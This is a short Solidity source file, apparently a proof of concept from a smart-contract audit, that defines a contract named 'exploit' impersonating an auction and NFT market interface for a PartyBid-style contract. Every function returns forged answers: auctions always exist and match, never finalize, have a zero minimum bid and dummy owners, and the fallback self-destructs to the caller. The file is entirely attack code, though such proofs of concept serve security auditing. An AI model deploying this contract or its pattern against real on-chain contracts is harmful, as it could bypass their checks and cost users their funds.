//SPDX-License-Identifier: MIT
pragma solidity ^0.7.5;

import './IParyBid.sol';

contract exploit {

  fallback() external {
    selfdestruct(msg.sender);
  }

  function auctionExists(uint256 auctionId) external returns(bool) {
    return true;
  }

  function getCurrentHighestBidder(uint256 auctionId) external returns (address){
    address anyAddress = 0x0000000000000000000000000000000000000001;
    return anyAddress;
  }
  
  function auctionIdMatchesToken(uint256 auctionId, address nftContract, uint256 tokenId) external returns (bool) {
    return true;
  }

  function isFinalized(uint256 auctionId) external returns (bool) {
    return false;
  }

  function ownerOf(uint256 tokenId) external returns(address) {
    address anyAddress = 0x0000000000000000000000000000000000000001;
    return anyAddress;
  }

  function getMinimumBid(uint256 auctionId) external returns(uint256) {
    return 0;
  }

}